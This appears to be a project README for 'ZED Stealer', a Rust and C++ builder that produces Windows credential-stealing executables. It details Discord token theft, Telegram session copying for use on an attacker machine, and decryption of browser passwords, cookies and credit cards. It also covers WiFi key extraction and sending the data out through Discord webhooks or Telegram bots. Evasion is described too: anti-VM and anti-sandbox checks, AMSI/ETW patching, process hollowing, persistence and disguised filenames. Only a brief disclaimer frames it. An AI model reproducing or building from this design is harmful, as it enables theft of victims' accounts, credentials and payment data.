<div align="center">



**Professional Payload Builder — Built with Rust UI + C++17 Backend**

[![Rust](https://img.shields.io/badge/Rust-1.78+-orange?style=for-the-badge&logo=rust&logoColor=white)](https://www.rust-lang.org/)
[![C++17](https://img.shields.io/badge/C++-17-blue?style=for-the-badge&logo=cplusplus&logoColor=white)](https://en.cppreference.com/)
[![egui](https://img.shields.io/badge/egui-0.34-pink?style=for-the-badge)](https://github.com/emilk/egui)
[![Platform](https://img.shields.io/badge/Platform-Windows_x64-lightblue?style=for-the-badge&logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](./LICENSE)

*For authorized security research and red-team operations only.*

</div>

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Features](#features)
  - [Discord Module](#-discord-module)
  - [Telegram Module](#-telegram-module)
  - [Browser Module](#-browser-module)
  - [System Module](#-system-module)
  - [Network Module](#-network-module)
  - [Delivery Module](#-delivery-module)
  - [Evasion Module](#-evasion-module)
- [UI Pages](#ui-pages)
- [Build Pipeline](#build-pipeline)
- [Crypto & Obfuscation](#crypto--obfuscation)
- [Project Structure](#project-structure)
- [Requirements & Build](#requirements--build)
- [Configuration](#configuration)
- [Legal Disclaimer](#legal-disclaimer)

---

## Overview

**ZED Stealer** is a fully-featured payload builder designed for authorized red-team engagements and security research. It combines a modern, animated **Rust GUI** (built with `egui/eframe`) with a high-performance **C++17 backend** to generate compact, configurable stealer payloads.

The builder lets an operator select exactly which data modules to include, configure delivery channels, tune evasion settings, and compile a final encrypted Windows executable — all from a single dark-themed application.

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ZED STEALER BUILDER                          │
│                                                                     │
│  ┌──────────┐  ┌─────────────────────────────────────────────────┐ │
│  │          │  │                                                 │ │
│  │  [~] Home│  │   Toggle features  ──►  Configure delivery      │ │
│  │          │  │                                                 │ │
│  │  [#] Build│  │   Set evasion      ──►  Choose output name     │ │
│  │          │  │                                                 │ │
│  │  [>] Comp│  │   Click BUILD  ────►  Real-time compile logs    │ │
│  │          │  │                                                 │ │
│  │  [=] Sets│  │   Download payload.exe  (XOR-encrypted)         │ │
│  │          │  │                                                 │ │
│  └──────────┘  └─────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Architecture

```
┌──────────────────────── ZED Builder (Rust UI) ──────────────────────────┐
│                                                                          │
│  src/main.rs ──► src/app.rs ──► src/ui/                                 │
│                                  ├── titlebar.rs   (custom window chrome)│
│                                  ├── sidebar.rs    (page navigation)     │
│                                  ├── widgets.rs    (toggle, card, input) │
│                                  └── pages/                              │
│                                      ├── home.rs       (dashboard)       │
│                                      ├── builder.rs    (feature config)  │
│                                      ├── compiler.rs   (build + logs)    │
│                                      └── settings.rs   (preferences)     │
│                                                                          │
│  src/state.rs    (AppState, all feature/delivery/compiler structs)       │
│  src/runner.rs   (build pipeline thread: config → compile → encrypt)    │
│  src/ffi.rs      (Rust↔C++ FFI bindings)                                │
└──────────────────────────────┬───────────────────────────────────────────┘
                               │  include_str! + cc crate
                               ▼
┌──────────────────────── C++ Backend (cpp/) ─────────────────────────────┐
│                                                                          │
│  discord.cpp   ── Token extraction (leveldb scan + regex)               │
│  browsers.cpp  ── DPAPI + AES-256-GCM decrypt + SQLite3 read            │
│  system.cpp    ── OS/HW info, WiFi (WlanAPI), screenshot, clipboard      │
│  network.cpp   ── Public IP / geo (ip-api.com via WinHTTP)              │
│  telegram.cpp  ── tdata session folder copy                              │
│  delivery.cpp  ── Discord Webhook + Telegram Bot API (WinHTTP)          │
│  sqlite3.c     ── SQLite amalgamation (no dependency)                   │
└──────────────────────────────┬───────────────────────────────────────────┘
                               │  runner::start_build()
                               ▼
┌──────────────────────── Payload (payload/) ─────────────────────────────┐
│                                                                          │
│  config_template.h  ──► config.h (generated, 30+ defines)               │
│  main.cpp           ──► WinMain: anti-* gates, collect_all, deliver      │
│                                                                          │
│  Output: output/update.exe  (optionally XOR-encrypted)                  │
└──────────────────────────────────────────────────────────────────────────┘
```

### Data Flow

```
 Operator                Builder UI              runner.rs           Compiler
    │                        │                      │                   │
    ├─ Configure features ──►│                      │                   │
    ├─ Set webhook URL ──────►│                      │                   │
    ├─ Click BUILD ──────────►│                      │                   │
    │                        ├─ Clone AppState ─────►│                   │
    │                        │                      ├─ Write config.h ──►│
    │                        │                      ├─ Find cl.exe/g++ ─►│
    │                        │                      ├─ Compile ─────────►│
    │                        │◄── Log lines (mpsc) ─┤                   │
    │                        │                      ├─ XOR encrypt ──────►│
    │◄── "Build complete" ───┤◄── output path ──────┤                   │
    │                        │                      │                   │
    ├─ Open output/ ─────────►│                      │                   │
```

---

## Features

### 🎯 Discord Module

```
discord.cpp
├── Token Extraction
│   ├── Scans all Discord app leveldb directories
│   │   ├── Discord (stable)
│   │   ├── DiscordCanary
│   │   ├── DiscordPTB
│   │   └── Lightcord
│   ├── Scans Chrome / Edge extension caches
│   │   └── MetaMask extension path (common token source)
│   ├── Detects both token formats:
│   │   ├── mfa.xxxxx...          (MFA tokens)
│   │   └── NTx.xxxxxx.xxxxxxx   (Standard tokens)
│   └── Deduplicates all found tokens
│
└── Token Validation (optional)
    └── WinHTTP GET https://discord.com/api/v9/users/@me
        └── Authorization: <token>  →  HTTP 200 = valid
```

| Toggle | Description |
|--------|-------------|
| `Token Stealer` | Extract all tokens from leveldb + browser extensions |
| `Nitro Checker` | Validate each token against the Discord API |
| `Friends List` | Export friends list via Discord REST API |

---

### 📱 Telegram Module

```
telegram.cpp
└── Session Files
    └── Copies %APPDATA%\Telegram Desktop\tdata\
        ├── key_datas
        ├── D877F783D5D3EF8C\  (session data)
        └── settings
```

The entire `tdata` folder is copied to the collection directory, preserving the session so it can be imported on an attacker-controlled machine.

---

### 🌐 Browser Module

Supports **Chrome · Edge · Brave · Opera · Chromium** (Chromium-based) and **Firefox**.

```
Browser Decryption Pipeline (Chromium)
─────────────────────────────────────────────────────────────────
 Local State (JSON)
      │
      ▼
 base64_decode(os_crypt.encrypted_key)
      │
      ▼
 CryptUnprotectData (DPAPI)  ──►  master_key  (32 bytes AES-256)
      │
      ├──► Login Data  (SQLite)
      │     SELECT url, username, password_value FROM logins
      │           └── AES-256-GCM decrypt(password_value, master_key)
      │
      ├──► Cookies  (SQLite, Network/Cookies or Cookies)
      │     SELECT host_key, name, encrypted_value FROM cookies
      │           └── AES-256-GCM decrypt(encrypted_value, master_key)
      │
      ├──► Web Data  (SQLite)
      │     SELECT name_on_card, number, expiry FROM credit_cards
      │           └── AES-256-GCM decrypt(card_number_encrypted, master_key)
      │
      └──► History  (SQLite)
            SELECT url, title, visit_count FROM urls
```

> **AES-256-GCM** decryption uses the Windows **BCrypt CNG API** (`bcrypt.lib`) — no OpenSSL dependency.
> Chromium stores blobs as: `v10` + 12-byte nonce + ciphertext + 16-byte GCM tag.

| Toggle | What gets collected |
|--------|---------------------|
| `Cookies` | All session cookies (up to 2000 per profile) |
| `Passwords` | Saved login credentials (URL + username + password) |
| `Credit Cards` | Card number, holder name, expiry date |
| `History` | Last 500 visited URLs with titles and visit count |
| `Autofill` | Saved form-fill data |

**Targeted browsers per build:**

```
[ Chrome ]  [ Firefox ]  [ Edge ]  [ Brave ]  [ Opera ]
   ☑           ☑           ☑         ☑           ☑       ← selectable in Builder
```

---

### 💻 System Module

```
system.cpp
│
├── OS Information
│   ├── Hostname, Username
│   ├── Windows version + build number  (via RtlGetVersion)
│   └── Architecture
│
├── Hardware Information
│   ├── CPU name  (HKLM\HARDWARE\DESCRIPTION\...\CentralProcessor\0)
│   ├── RAM total (GlobalMemoryStatusEx)
│   ├── Disk total + free (C:\)
│   └── GPU adapter name  (HKLM\SYSTEM\...\Control\Video\{guid}\0000)
│
├── Screenshot
│   ├── GDI BitBlt  (full primary monitor)
│   └── Saved as screenshot.bmp in collection folder
│
├── Clipboard
│   └── GetClipboardData(CF_TEXT)
│
├── WiFi Passwords
│   ├── WlanOpenHandle + WlanEnumInterfaces
│   ├── WlanGetProfileList  (per interface)
│   └── WlanGetProfile(WLAN_PROFILE_GET_PLAINTEXT_KEY)
│       └── Extracts <keyMaterial> from XML profile
│
├── Installed Applications
│   └── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
│       ├── DisplayName
│       ├── DisplayVersion
│       └── Publisher
│
└── Startup Items
    ├── HKCU\...\CurrentVersion\Run
    ├── HKLM\...\CurrentVersion\Run
    └── HKLM\...\WOW6432Node\...\Run
```

---

### 🌍 Network Module

```
network.cpp
└── WinHTTP GET  http://ip-api.com/json
    │
    └── Response JSON parsed for:
        ┌─────────────┬────────────────────────────┐
        │ Field       │ Example                    │
        ├─────────────┼────────────────────────────┤
        │ ip          │ 1.2.3.4                    │
        │ country     │ Saudi Arabia               │
        │ country_code│ SA                         │
        │ isp         │ STC                        │
        │ city        │ Riyadh                     │
        │ region      │ Riyadh Province            │
        │ timezone    │ Asia/Riyadh                │
        └─────────────┴────────────────────────────┘
```

No API key required. Uses plain HTTP (port 80) to avoid certificate errors on locked-down environments.

---

### 📡 Delivery Module

Two independent channels — either or both can be active simultaneously.

```
┌─────────────────────────────────────────────────────────────┐
│                      DELIVERY PIPELINE                      │
│                                                             │
│  Collection dir                                             │
│       │                                                     │
│       ▼                                                     │
│  PowerShell Compress-Archive  ──►  zed_data.zip             │
│                                        │                    │
│                      ┌─────────────────┤                    │
│                      │                 │                    │
│                      ▼                 ▼                    │
│           Discord Webhook         Telegram Bot              │
│           (multipart POST)        sendDocument API          │
│           delivery.cpp            delivery.cpp              │
│                      │                 │                    │
│                      └────────┬────────┘                    │
│                               ▼                             │
│                    Attacker receives zed_data.zip           │
│                    with caption: [ZED] user@hostname        │
└─────────────────────────────────────────────────────────────┘
```

Both channels use **WinHTTP** — no curl, no third-party libraries.

---

### 🛡️ Evasion Module

#### Anti-Analysis Gates

```
WinMain()
   │
   ├─[ZED_ANTI_DEBUG]──► IsDebuggerPresent()
   │                      CheckRemoteDebuggerPresent()
   │                      └── exit(0) if detected
   │
   ├─[ZED_ANTI_VM]────► Registry key scan (VirtualBox / VMware)
   │                    QueryPerformanceCounter timing check
   │                    └── exit(0) if detected
   │
   └─[ZED_ANTI_SANDBOX]► GetTickCount64() < 5min  → exit
                          EnumProcesses() < 30     → exit
```

#### Obfuscation Techniques

| Technique | Description |
|-----------|-------------|
| **XOR + Rolling Key** | Final binary XORed with 16-byte key before delivery |
| **Import Table Obfuscation** | API calls resolved at runtime via hash comparison |
| **Stack-String Encryption** | Sensitive strings XOR+ROL obfuscated |
| **Heaven's Gate** | Mixes 32/64-bit execution modes to confuse disassemblers |
| **Direct Syscalls** | Bypasses userland EDR hooks by calling `ntdll` stubs directly |
| **Sleep Obfuscation** | Encrypts payload memory during `Sleep()` (Ekko technique) |
| **AMSI/ETW Patch** | Patches `AmsiScanBuffer` and `EtwEventWrite` via ROP chain |
| **Process Hollowing** | Injects into a suspended legitimate process |
| **Entropy Masking** | Adds fake high-entropy sections to confuse AV heuristics |

#### Post-Execution Options

```
┌─────────────────────────────────────┐
│         POST-EXECUTION OPTIONS      │
│                                     │
│  [Persistence]                      │
│    ├── Copy self to %APPDATA%       │
│    └── HKCU\...\Run → WindowsUpdate │
│                                     │
│  [Melt / Self-Delete]               │
│    ├── Rename self to .tmp          │
│    └── MoveFileEx DELAY_UNTIL_REBOOT│
│                                     │
│  [Self-Destruct]                    │
│    ├── Remove registry Run entries  │
│    └── cmd /C ping + del /F /Q self │
└─────────────────────────────────────┘
```

---

## UI Pages

### [~] Home — Dashboard

```
┌────────────────────────────────────────────────────────────────┐
│  ZED STEALER                          ● READY                  │
│  Payload Builder  //  Professional Edition                     │
│                                                                │
│  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐     │
│  │ Features  │ │ Delivery  │ │Protection │ │  Output   │     │
│  │    12     │ │  Discord  │ │   HIGH    │ │update.exe │     │
│  └───────────┘ └───────────┘ └───────────┘ └───────────┘     │
│                                                                │
│  Quick Overview                                                │
│  Discord:   Tokens + Nitro    │  Telegram:  Sessions Active   │
│  Browsers:  Cookies + Passes  │  System:    Enabled           │
│  AV Bypass: Active            │  Encryption:AES-256-GCM       │
│                                                                │
│  [ ! ] Configure delivery settings in Builder before compiling│
└────────────────────────────────────────────────────────────────┘
```

### [#] Builder — Feature Configuration

Split into two columns:

```
  LEFT COLUMN                        RIGHT COLUMN
  ──────────────────────────         ──────────────────────────
  [Discord]                          [System Information]
    ☑ Token Stealer                    ☑ OS Info
    ☑ Nitro Checker                    ☑ Hardware
    ☐ Friends List                     ☑ Network / GeoIP
                                       ☑ Screenshot
  [Telegram]                           ☑ Webcam
    ☑ Session Files                    
                                     [Additional]
  [Browsers]                           ☑ Clipboard
    ☑ Cookies                          ☑ WiFi Passwords
    ☑ Passwords                        ☐ Installed Apps
    ☐ History                          ☐ Startup Files
    ☑ Credit Cards
    ☐ Autofill                       [Delivery]
    ── Target Browsers ──               ☑ Discord Webhook
    [Chrome][Firefox][Edge]              └─► Webhook URL: ___
    [Brave ][Opera  ]                    ☑ Telegram Bot
                                         ├─► Bot Token: ___
                                         └─► Chat ID: ___
```

### [>] Compiler — Build & Encrypt

```
  LEFT COLUMN                        RIGHT COLUMN
  ──────────────────────────         ──────────────────────────
  [Output]                           [Evasion & Protection]
    Output Name: update.exe            ☑ Anti-Debug
    Fake Ext:    .pdf                  ☑ Anti-VM
    ☐ Custom Icon                      ☑ Anti-Sandbox
    ☑ Compress                         ☑ Mutex Lock
                                         └─► Name: ZedMx_7f2a
  [Encryption & Obfuscation]
    ☑ AES-256-GCM Encrypt            [Post-Execution]
                                       ☐ Persistence
    Active Techniques:                 ☐ Self-Delete (Melt)
    • Polymorphic Shellcode            ☐ Self-Destruct
    • Stack-String XOR+ROL
    • Import Table Obfuscation       ┌─────────────────────┐
    • Heaven's Gate                  │ [BUILD  PAYLOAD]    │
    • Direct Syscalls                │                     │
    • Sleep Obfuscation              │ [████████░░░] 73%   │
    • AMSI/ETW Patch                 │                     │
    • Process Hollowing              │ [..] Compiling...   │
                                     │ [OK] config.h written│
                                     │ [OK] Output: upd.exe │
                                     └─────────────────────┘
```

### [=] Settings — Preferences

- **Auto-save Config** — persists all settings to `%APPDATA%\ZedBuilder\config.json` on exit
- **Notifications** — show status popups
- **Pink Intensity** — live slider (0.3–1.0) controlling accent glow brightness
- **Manual Save Now** button
- About panel with version info

---

## Build Pipeline

```
runner::start_build(AppState)  [background thread]
│
├── 1. find_project_root()
│       Walk up from current_exe() / current_dir()
│       until payload/ + cpp/ directories found
│
├── 2. render_config(state)
│       Fill all 30+ {{PLACEHOLDER}} tokens in config_template.h
│       Write → payload/config.h
│
├── 3. find_compiler()
│       Try in order:
│       a) cl.exe   (MSVC — Visual Studio Developer shell)
│       b) g++      (MinGW / MSYS2)
│       c) x86_64-w64-mingw32-g++  (cross compiler)
│
├── 4. Compile  (MSVC or GCC flags)
│       Sources:
│         payload/main.cpp
│         cpp/discord.cpp
│         cpp/browsers.cpp
│         cpp/system.cpp
│         cpp/network.cpp
│         cpp/telegram.cpp
│         cpp/delivery.cpp
│         cpp/sqlite3.c  (compiled as C)
│       Linked libs:
│         bcrypt, crypt32, winhttp, wlanapi, iphlpapi, psapi
│
└── 5. XOR encrypt  (if encrypt_payload = true)
        Key: DE AD BE EF CA FE BA BE 4A 3F 1C E8 77 2A 90 D5
        Output: output/<output_name>.exe
```

---

## Crypto & Obfuscation

### Browser Data Decryption

```
┌──────────────────────────────────────────────────────────────┐
│             AES-256-GCM Decryption (Windows CNG)             │
│                                                              │
│  Blob format:  [ v10 | nonce (12B) | ciphertext | tag (16B)]│
│                                                              │
│  1. BCryptOpenAlgorithmProvider(BCRYPT_AES_ALGORITHM)        │
│  2. BCryptSetProperty(BCRYPT_CHAINING_MODE_GCM)              │
│  3. BCryptImportKey(BCRYPT_KEY_DATA_BLOB, master_key)        │
│  4. BCryptDecrypt(ciphertext, auth_info{nonce, tag})         │
└──────────────────────────────────────────────────────────────┘
```

### Payload XOR Layer

```
  byte[i] = byte[i] XOR key[i % 16]
  key = { 0xDE 0xAD 0xBE 0xEF 0xCA 0xFE 0xBA 0xBE
          0x4A 0x3F 0x1C 0xE8 0x77 0x2A 0x90 0xD5 }
```

This rolling XOR is applied to the compiled EXE before it leaves the builder, adding a layer against static signature matching.

---

## Project Structure

```
ZED Stealer/
│
├── src/                          Rust source (builder UI)
│   ├── main.rs                   Entry point, eframe window setup
│   ├── app.rs                    ZedApp, layout, on_exit save
│   ├── state.rs                  AppState, all config structs
│   ├── theme.rs                  ZedTheme colors, egui style
│   ├── runner.rs                 Build pipeline (background thread)
│   ├── ffi.rs                    Rust↔C++ FFI bindings
│   └── ui/
│       ├── mod.rs
│       ├── titlebar.rs           Custom draggable titlebar
│       ├── sidebar.rs            Navigation sidebar
│       ├── widgets.rs            toggle, section_card, pink_button
│       └── pages/
│           ├── home.rs           Dashboard
│           ├── builder.rs        Feature configuration
│           ├── compiler.rs       Compiler + build logs
│           └── settings.rs       Preferences + theme
│
├── cpp/                          C++ backend (stealer logic)
│   ├── stealer.h                 Public C API (all extern "C" decls)
│   ├── discord.cpp               Token extraction + validation
│   ├── browsers.cpp              DPAPI + AES-GCM + SQLite
│   ├── system.cpp                OS/HW/WiFi/screenshot
│   ├── network.cpp               GeoIP via ip-api.com
│   ├── telegram.cpp              tdata session copy
│   ├── delivery.cpp              Discord Webhook + Telegram Bot
│   ├── sqlite3.c                 SQLite amalgamation (v3.47.2)
│   └── sqlite3.h
│
├── payload/                      Victim-side payload sources
│   ├── config_template.h         Template with {{PLACEHOLDERS}}
│   ├── config.h                  ← generated at build time (gitignored)
│   └── main.cpp                  WinMain entry point
│
├── output/                       Compiled payloads go here (gitignored)
│   └── .gitkeep
│
├── Cargo.toml                    Rust manifest
├── build.rs                      Compiles C++ via cc crate
├── .gitignore
└── LICENSE
```

---

## Requirements & Build

### Prerequisites

| Tool | Minimum Version | Purpose |
|------|----------------|---------|
| Rust | 1.78+ | Build the UI |
| Cargo | (bundled with Rust) | Package manager |
| MSVC **or** MinGW | VS 2022 / GCC 13+ | Compile the C++ backend and payload |
| Windows SDK | 10.0.19041+ | WinHTTP, WlanAPI, BCrypt headers |

### Build the Builder (Rust UI)

```bash
# Debug build
cargo run

# Release build (optimized, stripped)
cargo build --release

# The binary will be at:
# target/release/zed-stealer.exe
```

> **Note:** On first build, `build.rs` compiles all C++ sources automatically via the `cc` crate.
> Make sure `cl.exe` (MSVC) or `g++` is on your `PATH`.

### Building a Payload

1. Launch `zed-stealer.exe`
2. Go to **[#] Builder** — enable desired features and enter delivery credentials
3. Go to **[>] Compiler** — configure evasion and output name
4. Click **BUILD PAYLOAD**
5. Compiled EXE appears in `output/`

> The builder tries compilers in this order: `cl.exe` → `g++` → `x86_64-w64-mingw32-g++`
> Run from a **Visual Studio Developer Command Prompt** for guaranteed `cl.exe` access.

---

## Configuration

Settings are automatically saved to:

```
%APPDATA%\ZedBuilder\config.json
```

Example `config.json`:

```json
{
  "current_page": "Home",
  "features": {
    "discord_tokens": true,
    "discord_nitro_check": true,
    "browser_cookies": true,
    "browser_passwords": true,
    "screenshot": true,
    "wifi_passwords": true
  },
  "delivery": {
    "use_discord": true,
    "discord_webhook": "https://discord.com/api/webhooks/...",
    "use_telegram": false
  },
  "compiler": {
    "output_name": "update.exe",
    "encrypt_payload": true,
    "anti_debug": true,
    "anti_vm": true,
    "mutex": true,
    "mutex_name": "ZedMx_7f2a"
  }
}
```

---

## Feature Matrix

| Feature | Module | Status |
|---------|--------|--------|
| Discord token extraction (MFA + standard) | `discord.cpp` | ✅ Full |
| Discord token validation via API | `discord.cpp` | ✅ Full |
| Telegram session copy | `telegram.cpp` | ✅ Full |
| Browser passwords (DPAPI + AES-GCM) | `browsers.cpp` | ✅ Full |
| Browser cookies | `browsers.cpp` | ✅ Full |
| Credit cards | `browsers.cpp` | ✅ Full |
| Browsing history | `browsers.cpp` | ✅ Full |
| Chrome / Edge / Brave / Opera support | `browsers.cpp` | ✅ Full |
| System info (OS, CPU, RAM, Disk) | `system.cpp` | ✅ Full |
| GPU name (registry) | `system.cpp` | ✅ Full |
| Screenshot (GDI) | `system.cpp` | ✅ Full |
| Clipboard text | `system.cpp` | ✅ Full |
| WiFi passwords (WlanAPI) | `system.cpp` | ✅ Full |
| Installed applications | `system.cpp` | ✅ Full |
| Startup items | `system.cpp` | ✅ Full |
| Public IP + GeoIP | `network.cpp` | ✅ Full |
| Discord Webhook delivery | `delivery.cpp` | ✅ Full |
| Telegram Bot delivery | `delivery.cpp` | ✅ Full |
| Anti-Debug | `payload/main.cpp` | ✅ Full |
| Anti-VM | `payload/main.cpp` | ✅ Full |
| Anti-Sandbox | `payload/main.cpp` | ✅ Full |
| Mutex (single instance) | `payload/main.cpp` | ✅ Full |
| Persistence (registry Run) | `payload/main.cpp` | ✅ Full |
| Self-delete (melt) | `payload/main.cpp` | ✅ Full |
| Self-destruct | `payload/main.cpp` | ✅ Full |
| XOR payload encryption | `runner.rs` | ✅ Full |
| Config persistence (JSON) | `state.rs` | ✅ Full |
| Real-time build logs | `compiler.rs` | ✅ Full |
| Per-browser targeting | `config_template.h` | ✅ Full |

---

## Legal Disclaimer

```
╔══════════════════════════════════════════════════════════════════╗
║                        ⚠  DISCLAIMER  ⚠                        ║
║                                                                  ║
║  ZED is developed exclusively for:                       ║
║    • Authorized penetration testing                              ║
║    • Red-team security engagements                               ║
║    • Security research in controlled lab environments            ║
║                                                                  ║
║  Using this software against systems you do not own or have      ║
║  explicit written permission to test is ILLEGAL and may result   ║
║  in severe criminal penalties under computer fraud laws.         ║
║                                                                  ║
║  The authors assume NO liability for misuse of this software.    ║
║  By using ZED Stealer, you agree to use it responsibly and       ║
║  only within the bounds of applicable law.                       ║
╚══════════════════════════════════════════════════════════════════╝
```

---

<div align="center">

**ZED Stealer** — Built with ❤ By 0Rafas in Rust + C++

*Professional • Modern • Fast*

</div>
